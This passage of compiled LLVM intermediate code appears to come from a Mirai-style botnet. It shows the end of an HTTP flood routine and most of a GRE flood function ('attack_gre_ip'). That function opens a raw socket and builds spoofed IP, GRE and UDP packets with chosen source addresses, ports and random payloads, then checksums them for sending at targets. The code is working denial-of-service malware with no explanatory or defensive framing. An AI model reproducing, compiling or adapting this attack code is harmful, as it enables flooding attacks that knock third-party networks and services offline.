  %868 = icmp eq i8 %867, 0
  br i1 %868, label %869, label %874

; <label>:869:                                    ; preds = %864
  %870 = call signext i8 @util_strcmp(i8* %866, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0)) #9
  %871 = icmp eq i8 %870, 0
  br i1 %871, label %872, label %874

; <label>:872:                                    ; preds = %869
  %873 = icmp sgt i32 %430, %865
  %.sink13 = select i1 %873, i8 10, i8 1
  br label %874

; <label>:874:                                    ; preds = %864, %869, %872
  %storemerge562 = phi i8 [ %.sink13, %872 ], [ 7, %869 ], [ 7, %864 ]
  store i8 %storemerge562, i8* %417, align 4
  %875 = load i32, i32* %381, align 4
  %876 = sext i32 %865 to i64
  %877 = call i64 @recv(i32 %875, i8* nonnull %21, i64 %876, i32 16384) #9
  br label %.loopexit611

; <label>:878:                                    ; preds = %.preheader610, %.backedge
  %879 = load i32, i32* %419, align 4
  %880 = icmp eq i32 %879, 1024
  br i1 %880, label %881, label %882

; <label>:881:                                    ; preds = %878
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %420, i8* nonnull %421, i64 960, i32 1, i1 false)
  store i32 960, i32* %419, align 4
  br label %882

; <label>:882:                                    ; preds = %881, %878
  %883 = tail call i32* @__errno_location() #10
  store i32 0, i32* %883, align 4
  %884 = load i32, i32* %381, align 4
  %885 = load i32, i32* %419, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %886
  %888 = sub nsw i32 1024, %885
  %889 = sext i32 %888 to i64
  %890 = call i64 @recv(i32 %884, i8* %887, i64 %889, i32 16384) #9
  %891 = trunc i64 %890 to i32
  switch i32 %891, label %897 [
    i32 0, label %.thread601
    i32 -1, label %892
  ]

.thread601:                                       ; preds = %882
  store i32 104, i32* %883, align 4
  br label %894

; <label>:892:                                    ; preds = %882
  %.pr600 = load i32, i32* %883, align 4
  %893 = icmp eq i32 %.pr600, 11
  br i1 %893, label %.loopexit611, label %894

; <label>:894:                                    ; preds = %.thread601, %892
  %895 = load i32, i32* %381, align 4
  %896 = call i32 @close(i32 %895) #9
  store i32 -1, i32* %381, align 4
  store i8 0, i8* %417, align 4
  br label %.loopexit611

; <label>:897:                                    ; preds = %882
  %898 = load i32, i32* %419, align 4
  %899 = add nsw i32 %898, %891
  store i32 %899, i32* %419, align 4
  store i32 %379, i32* %422, align 4
  br label %900

; <label>:900:                                    ; preds = %997, %897
  %901 = phi i32 [ %1004, %997 ], [ %899, %897 ]
  %902 = load i32, i32* %423, align 4
  %903 = icmp sgt i32 %902, 0
  br i1 %903, label %904, label %965

; <label>:904:                                    ; preds = %900
  %905 = icmp sgt i32 %902, %901
  %.sink14 = select i1 %905, i32* %419, i32* %423
  %906 = load i32, i32* %.sink14, align 4
  %907 = sub nsw i32 %902, %906
  store i32 %907, i32* %423, align 4
  %908 = load i32, i32* %424, align 4
  %909 = icmp eq i32 %908, 1
  br i1 %909, label %910, label %965

; <label>:910:                                    ; preds = %904
  %911 = call i8* @table_retrieve_val(i32 36, i32* null)
  %912 = call i32 @util_memsearch(i8* nonnull %420, i32 %901, i8* %911, i32 11)
  %913 = icmp eq i32 %912, -1
  br i1 %913, label %thread-pre-split593, label %914

; <label>:914:                                    ; preds = %910
  %915 = load i32, i32* %419, align 4
  %916 = call i8* @table_retrieve_val(i32 36, i32* null)
  %917 = call i32 @util_memsearch(i8* nonnull %420, i32 %915, i8* %916, i32 11)
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %918
  %920 = load i32, i32* %419, align 4
  %921 = sub nsw i32 %920, %917
  %922 = call i32 @util_memsearch(i8* %919, i32 %921, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %923 = add i32 %917, -1
  %924 = add i32 %923, %922
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %925
  store i8 0, i8* %926, align 1
  %927 = load i32, i32* %426, align 4
  %928 = icmp slt i32 %927, 5
  br i1 %928, label %929, label %964

; <label>:929:                                    ; preds = %914
  %930 = call i32 @util_strlen(i8* %919) #9
  %931 = icmp slt i32 %930, 128
  br i1 %931, label %932, label %964

; <label>:932:                                    ; preds = %929
  %933 = load i32, i32* %426, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %934, i64 0
  %936 = call i32 @util_strcpy(i8* %935, i8* %919) #9
  %937 = load i32, i32* %426, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %938, i64 0
  %940 = call i32 @util_strlen(i8* %939) #9
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %938, i64 %941
  %943 = call i32 @util_strcpy(i8* %942, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0)) #9
  %944 = add i32 %917, 3
  %945 = add i32 %944, %922
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %946
  %948 = load i32, i32* %419, align 4
  %949 = sub nsw i32 %948, %945
  %950 = call i32 @util_memsearch(i8* %947, i32 %949, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %951 = add i32 %945, -1
  %952 = add i32 %951, %950
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %953
  store i8 0, i8* %954, align 1
  %955 = load i32, i32* %426, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %956, i64 0
  %958 = call i32 @util_strlen(i8* %957) #9
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %956, i64 %959
  %961 = call i32 @util_strcpy(i8* %960, i8* %947) #9
  %962 = load i32, i32* %426, align 4
  %963 = add nsw i32 %962, 1
  store i32 %963, i32* %426, align 4
  br label %964

; <label>:964:                                    ; preds = %932, %929, %914
  store i32 -1, i32* %423, align 4
  store i8 10, i8* %417, align 4
  br label %.loopexit611

thread-pre-split593:                              ; preds = %910
  %.pr594 = load i32, i32* %423, align 4
  br label %965

; <label>:965:                                    ; preds = %thread-pre-split593, %904, %900
  %966 = phi i32 [ %.pr594, %thread-pre-split593 ], [ %907, %904 ], [ %902, %900 ]
  %.0542 = phi i32 [ %906, %thread-pre-split593 ], [ %906, %904 ], [ 0, %900 ]
  %967 = icmp eq i32 %966, 0
  br i1 %967, label %968, label %995

; <label>:968:                                    ; preds = %965
  %969 = load i32, i32* %425, align 4
  %970 = icmp eq i32 %969, 1
  %971 = load i32, i32* %419, align 4
  br i1 %970, label %972, label %990

; <label>:972:                                    ; preds = %968
  %973 = call i32 @util_memsearch(i8* nonnull %420, i32 %971, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %974 = icmp eq i32 %973, -1
  br i1 %974, label %995, label %975

; <label>:975:                                    ; preds = %972
  %976 = add nsw i32 %973, -2
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %977
  store i8 0, i8* %978, align 1
  %979 = call i32 @util_memsearch(i8* nonnull %420, i32 %973, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %980 = icmp eq i32 %979, -1
  br i1 %980, label %984, label %981

; <label>:981:                                    ; preds = %975
  %982 = sext i32 %979 to i64
  %983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %982
  store i8 0, i8* %983, align 1
  br label %984

; <label>:984:                                    ; preds = %975, %981
  %985 = call i32 @util_atoi(i8* nonnull %420, i32 16) #9
  %986 = icmp eq i32 %985, 0
  br i1 %986, label %987, label %988

; <label>:987:                                    ; preds = %984
  store i8 1, i8* %417, align 4
  br label %.loopexit611

; <label>:988:                                    ; preds = %984
  %989 = add nsw i32 %985, 2
  store i32 %989, i32* %423, align 4
  br label %995

; <label>:990:                                    ; preds = %968
  %991 = sub nsw i32 %971, %.0542
  store i32 %991, i32* %423, align 4
  %992 = icmp eq i32 %991, 0
  br i1 %992, label %993, label %995

; <label>:993:                                    ; preds = %990
  store i8 1, i8* %417, align 4
  br label %.loopexit611

.backedge:                                        ; preds = %995, %997
  %.pr = load i8, i8* %417, align 4
  %994 = icmp eq i8 %.pr, 7
  br i1 %994, label %878, label %.loopexit611.loopexit

; <label>:995:                                    ; preds = %972, %988, %990, %965
  %.1543 = phi i32 [ %973, %988 ], [ %.0542, %972 ], [ %.0542, %990 ], [ %.0542, %965 ]
  %996 = icmp eq i32 %.1543, 0
  br i1 %996, label %.backedge, label %997

; <label>:997:                                    ; preds = %995
  %998 = load i32, i32* %419, align 4
  %999 = sub nsw i32 %998, %.1543
  store i32 %999, i32* %419, align 4
  %1000 = sext i32 %.1543 to i64
  %1001 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %1000
  %1002 = sext i32 %999 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %420, i8* %1001, i64 %1002, i32 1, i1 false)
  %1003 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %1002
  store i8 0, i8* %1003, align 1
  %1004 = load i32, i32* %419, align 4
  %1005 = icmp eq i32 %1004, 0
  br i1 %1005, label %.backedge, label %900

.preheader612:                                    ; preds = %.preheader612.preheader, %.preheader612
  %1006 = tail call i32* @__errno_location() #10
  store i32 0, i32* %1006, align 4
  %1007 = load i32, i32* %381, align 4
  %1008 = call i64 @recv(i32 %1007, i8* nonnull %21, i64 10240, i32 16384) #9
  %1009 = trunc i64 %1008 to i32
  switch i32 %1009, label %.preheader612 [
    i32 0, label %.thread604
    i32 -1, label %1010
  ]

.thread604:                                       ; preds = %.preheader612
  store i32 104, i32* %1006, align 4
  br label %.thread598

; <label>:1010:                                   ; preds = %.preheader612
  %.pr603 = load i32, i32* %1006, align 4
  %1011 = icmp eq i32 %.pr603, 11
  br i1 %1011, label %1014, label %.thread598

.thread598:                                       ; preds = %1010, %.thread604
  %1012 = load i32, i32* %381, align 4
  %1013 = call i32 @close(i32 %1012) #9
  store i32 -1, i32* %381, align 4
  store i8 0, i8* %417, align 4
  br label %.loopexit611

; <label>:1014:                                   ; preds = %1010
  %.pr597 = load i8, i8* %417, align 4
  %1015 = icmp eq i8 %.pr597, 0
  br i1 %1015, label %.loopexit611, label %1016

; <label>:1016:                                   ; preds = %1014
  store i8 1, i8* %417, align 4
  br label %.loopexit611

.loopexit611.loopexit:                            ; preds = %.backedge
  br label %.loopexit611

.loopexit611:                                     ; preds = %.loopexit611.loopexit, %993, %987, %964, %.thread598, %416, %892, %1014, %405, %894, %1016, %874, %435, %.lr.ph653, %861, %700, %432, %401
  %indvars.iv.next680 = add nuw nsw i64 %indvars.iv679, 1
  %1017 = icmp slt i64 %indvars.iv.next680, %48
  br i1 %1017, label %.lr.ph653, label %.backedge616.loopexit

; <label>:1018:                                   ; preds = %30, %27, %24, %4
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i32 @util_strlen(i8*) local_unnamed_addr #3

declare i32 @util_strcpy(i8*, i8*) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

declare void @util_zero(i8*, i32) local_unnamed_addr #3

declare i8* @util_itoa(i32, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strcmp(i8*, i8*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @util_stristr(i8*, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strncmp(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %284, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #9
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %92, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  %.pre = sext i32 %21 to i64
  %.pre134 = add nsw i64 %.pre, 52
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = trunc i64 %.pre134 to i16
  %37 = icmp eq i8 %16, 0
  %38 = add nsw i64 %.pre, 28
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %12, -1
  %41 = icmp eq i8 %25, 0
  %42 = add nsw i64 %.pre, 8
  %43 = trunc i64 %42 to i16
  %44 = zext i8 %0 to i64
  br i1 %37, label %.lr.ph127.split.preheader, label %.lr.ph127.split.us.preheader

.lr.ph127.split.us.preheader:                     ; preds = %.lr.ph127
  br label %.lr.ph127.split.us

.lr.ph127.split.preheader:                        ; preds = %.lr.ph127
  br label %.lr.ph127.split

.lr.ph127.split.us:                               ; preds = %.lr.ph127.split.us.preheader, %.lr.ph127.split.us
  %indvars.iv132 = phi i64 [ %indvars.iv.next133, %.lr.ph127.split.us ], [ 0, %.lr.ph127.split.us.preheader ]
  %45 = call noalias i8* @calloc(i64 1510, i64 8) #9
  %46 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv132
  store i8* %45, i8** %46, align 8
  %47 = getelementptr inbounds i8, i8* %45, i64 24
  %48 = getelementptr inbounds i8, i8* %45, i64 44
  store i8 69, i8* %45, align 4
  %49 = getelementptr inbounds i8, i8* %45, i64 1
  store i8 %10, i8* %49, align 1
  %50 = call zeroext i16 @htons(i16 zeroext %36) #10
  %51 = getelementptr inbounds i8, i8* %45, i64 2
  %52 = bitcast i8* %51 to i16*
  store i16 %50, i16* %52, align 2
  %53 = call zeroext i16 @htons(i16 zeroext %12) #10
  %54 = getelementptr inbounds i8, i8* %45, i64 4
  %55 = bitcast i8* %54 to i16*
  store i16 %53, i16* %55, align 4
  %56 = getelementptr inbounds i8, i8* %45, i64 8
  store i8 %14, i8* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %58 = getelementptr inbounds i8, i8* %45, i64 6
  %59 = bitcast i8* %58 to i16*
  store i16 %57, i16* %59, align 2
  %60 = getelementptr inbounds i8, i8* %45, i64 9
  store i8 47, i8* %60, align 1
  %61 = getelementptr inbounds i8, i8* %45, i64 12
  %62 = bitcast i8* %61 to i32*
  store i32 %27, i32* %62, align 4
  %63 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv132, i32 1
  %64 = load i32, i32* %63, align 4
  %65 = getelementptr inbounds i8, i8* %45, i64 16
  %66 = bitcast i8* %65 to i32*
  store i32 %64, i32* %66, align 4
  %67 = call zeroext i16 @htons(i16 zeroext 2048) #10
  %68 = getelementptr inbounds i8, i8* %45, i64 22
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 2
  store i8 69, i8* %47, align 4
  %70 = getelementptr inbounds i8, i8* %45, i64 25
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext %39) #10
  %72 = getelementptr inbounds i8, i8* %45, i64 26
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %40) #10
  %75 = getelementptr inbounds i8, i8* %45, i64 28
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %45, i64 32
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %45, i64 30
  %79 = bitcast i8* %78 to i16*
  store i16 %57, i16* %79, align 2
  %80 = getelementptr inbounds i8, i8* %45, i64 33
  store i8 17, i8* %80, align 1
  %. = select i1 %41, i32 1023, i32 %64
  %81 = getelementptr inbounds i8, i8* %45, i64 40
  %82 = bitcast i8* %81 to i32*
  store i32 %., i32* %82, align 4
  %83 = call zeroext i16 @htons(i16 zeroext %18) #10
  %84 = bitcast i8* %48 to i16*
  store i16 %83, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext %20) #10
  %86 = getelementptr inbounds i8, i8* %45, i64 46
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %43) #10
  %89 = getelementptr inbounds i8, i8* %45, i64 48
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  %indvars.iv.next133 = add nsw i64 %indvars.iv132, 1
  %91 = icmp slt i64 %indvars.iv.next133, %44
  br i1 %91, label %.lr.ph127.split.us, label %..preheader_crit_edge.loopexit142

; <label>:92:                                     ; preds = %30
  %93 = call i32 @close(i32 %28) #9
  br label %284

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph127.split
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit142:                ; preds = %.lr.ph127.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit142, %..preheader_crit_edge.loopexit
  %.lcssa128.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next133, %..preheader_crit_edge.loopexit142 ]
  %.lcssa128 = trunc i64 %.lcssa128.in to i32
  store i32 %.lcssa128, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader125, %..preheader_crit_edge
  %94 = icmp eq i32 %27, -1
  %95 = and i32 %11, 65535
  %96 = icmp eq i32 %95, 65535
  %97 = and i32 %17, 65535
  %98 = icmp eq i32 %97, 65535
  %99 = and i32 %19, 65535
  %100 = icmp eq i32 %99, 65535
  %101 = icmp eq i8 %25, 0
  %102 = icmp eq i8 %23, 0
  %103 = add i32 %21, 8
  br label %.loopexit

.lr.ph127.split:                                  ; preds = %.lr.ph127.split.preheader, %.lr.ph127.split
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph127.split ], [ 0, %.lr.ph127.split.preheader ]
  %104 = call noalias i8* @calloc(i64 1510, i64 8) #9
  %105 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %104, i8** %105, align 8
  %106 = getelementptr inbounds i8, i8* %104, i64 24
  %107 = getelementptr inbounds i8, i8* %104, i64 44
  store i8 69, i8* %104, align 4
  %108 = getelementptr inbounds i8, i8* %104, i64 1
  store i8 %10, i8* %108, align 1
  %109 = call zeroext i16 @htons(i16 zeroext %36) #10
  %110 = getelementptr inbounds i8, i8* %104, i64 2
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %12) #10
  %113 = getelementptr inbounds i8, i8* %104, i64 4
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %104, i64 8
  store i8 %14, i8* %115, align 4
  %116 = getelementptr inbounds i8, i8* %104, i64 9
  store i8 47, i8* %116, align 1
  %117 = getelementptr inbounds i8, i8* %104, i64 12
  %118 = bitcast i8* %117 to i32*
  store i32 %27, i32* %118, align 4
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %120 = load i32, i32* %119, align 4
  %121 = getelementptr inbounds i8, i8* %104, i64 16
  %122 = bitcast i8* %121 to i32*
  store i32 %120, i32* %122, align 4
  %123 = call zeroext i16 @htons(i16 zeroext 2048) #10
  %124 = getelementptr inbounds i8, i8* %104, i64 22
  %125 = bitcast i8* %124 to i16*
  store i16 %123, i16* %125, align 2
  store i8 69, i8* %106, align 4
  %126 = getelementptr inbounds i8, i8* %104, i64 25
  store i8 %10, i8* %126, align 1
  %127 = call zeroext i16 @htons(i16 zeroext %39) #10
  %128 = getelementptr inbounds i8, i8* %104, i64 26
  %129 = bitcast i8* %128 to i16*
  store i16 %127, i16* %129, align 2
  %130 = call zeroext i16 @htons(i16 zeroext %40) #10
  %131 = getelementptr inbounds i8, i8* %104, i64 28
  %132 = bitcast i8* %131 to i16*
  store i16 %130, i16* %132, align 4
  %133 = getelementptr inbounds i8, i8* %104, i64 32
  store i8 %14, i8* %133, align 4
  %134 = getelementptr inbounds i8, i8* %104, i64 33
  store i8 17, i8* %134, align 1
  %.138 = select i1 %41, i32 1023, i32 %120
  %135 = getelementptr inbounds i8, i8* %104, i64 40
  %136 = bitcast i8* %135 to i32*
  store i32 %.138, i32* %136, align 4
  %137 = call zeroext i16 @htons(i16 zeroext %18) #10
  %138 = bitcast i8* %107 to i16*
  store i16 %137, i16* %138, align 2
  %139 = call zeroext i16 @htons(i16 zeroext %20) #10
  %140 = getelementptr inbounds i8, i8* %104, i64 46
  %141 = bitcast i8* %140 to i16*
  store i16 %139, i16* %141, align 2
  %142 = call zeroext i16 @htons(i16 zeroext %43) #10
  %143 = getelementptr inbounds i8, i8* %104, i64 48
  %144 = bitcast i8* %143 to i16*
  store i16 %142, i16* %144, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %145 = icmp slt i64 %indvars.iv.next, %44
  br i1 %145, label %.lr.ph127.split, label %..preheader_crit_edge.loopexit

.loopexit.loopexit:                               ; preds = %187
  br label %.loopexit.backedge

.loopexit.loopexit141:                            ; preds = %255
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %35, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit141
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %94, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %187
  %storemerge124126.us = phi i32 [ %214, %187 ], [ 0, %.lr.ph.split.us.preheader ]
  %146 = sext i32 %storemerge124126.us to i64
  %147 = getelementptr inbounds i8*, i8** %8, i64 %146
  %148 = load i8*, i8** %147, align 8
  %149 = getelementptr inbounds i8, i8* %148, i64 24
  %150 = bitcast i8* %149 to %struct.iphdr*
  %151 = getelementptr inbounds i8, i8* %148, i64 44
  %152 = getelementptr inbounds i8, i8* %148, i64 52
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = icmp ult i8 %154, 32
  br i1 %155, label %156, label %163

; <label>:156:                                    ; preds = %.lr.ph.split.us
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 1
  %158 = load i32, i32* %157, align 4
  %159 = call i32 @ntohl(i32 %158) #10
  %160 = call i32 @htonl(i32 %159) #10
  %161 = getelementptr inbounds i8, i8* %148, i64 16
  %162 = bitcast i8* %161 to i32*
  store i32 %160, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %.lr.ph.split.us, %156
  %164 = getelementptr inbounds i8, i8* %148, i64 12
  %165 = bitcast i8* %164 to i32*
  store i32 0, i32* %165, align 4
  br i1 %96, label %166, label %171

; <label>:166:                                    ; preds = %163
  %167 = getelementptr inbounds i8, i8* %148, i64 4
  %168 = bitcast i8* %167 to i16*
  store i16 0, i16* %168, align 4
  %169 = getelementptr inbounds i8, i8* %148, i64 28
  %170 = bitcast i8* %169 to i16*
  store i16 999, i16* %170, align 4
  br label %171

; <label>:171:                                    ; preds = %166, %163
  br i1 %98, label %172, label %174

; <label>:172:                                    ; preds = %171
  %173 = bitcast i8* %151 to i16*
  store i16 0, i16* %173, align 2
  br label %174

; <label>:174:                                    ; preds = %172, %171
  br i1 %100, label %175, label %178

; <label>:175:                                    ; preds = %174
  %176 = getelementptr inbounds i8, i8* %148, i64 46
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  br label %178

; <label>:178:                                    ; preds = %175, %174
  br i1 %101, label %183, label %179

; <label>:179:                                    ; preds = %178
  %180 = getelementptr inbounds i8, i8* %148, i64 16
  %181 = bitcast i8* %180 to i32*
  %182 = load i32, i32* %181, align 4
  br label %183

; <label>:183:                                    ; preds = %179, %178
  %.sink3.us = phi i32 [ %182, %179 ], [ 0, %178 ]
  %184 = getelementptr inbounds i8, i8* %148, i64 40
  %185 = bitcast i8* %184 to i32*
  store i32 %.sink3.us, i32* %185, align 4
  br i1 %102, label %187, label %186

; <label>:186:                                    ; preds = %183
  call void @rand_str(i8* nonnull %152, i32 %21)
  br label %187

; <label>:187:                                    ; preds = %186, %183
  %188 = getelementptr inbounds i8, i8* %148, i64 10
  %189 = bitcast i8* %188 to i16*
  store i16 0, i16* %189, align 2
  %190 = bitcast i8* %148 to i16*
  %191 = call zeroext i16 @checksum_generic(i16* %190, i32 20) #9
  store i16 %191, i16* %189, align 2
  %192 = getelementptr inbounds i8, i8* %148, i64 34
  %193 = bitcast i8* %192 to i16*
  store i16 0, i16* %193, align 2
  %194 = bitcast i8* %149 to i16*
  %195 = call zeroext i16 @checksum_generic(i16* %194, i32 20) #9
  store i16 %195, i16* %193, align 2
  %196 = getelementptr inbounds i8, i8* %148, i64 50
  %197 = bitcast i8* %196 to i16*
  store i16 0, i16* %197, align 2
  %198 = getelementptr inbounds i8, i8* %148, i64 48
  %199 = bitcast i8* %198 to i16*
  %200 = load i16, i16* %199, align 2
  %201 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %150, i8* nonnull %151, i16 zeroext %200, i32 %103) #9
  store i16 %201, i16* %197, align 2
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0, i32 0
  store i16 2, i16* %204, align 4
  %205 = getelementptr inbounds i8, i8* %148, i64 16
  %206 = bitcast i8* %205 to i32*
  %207 = load i32, i32* %206, align 4
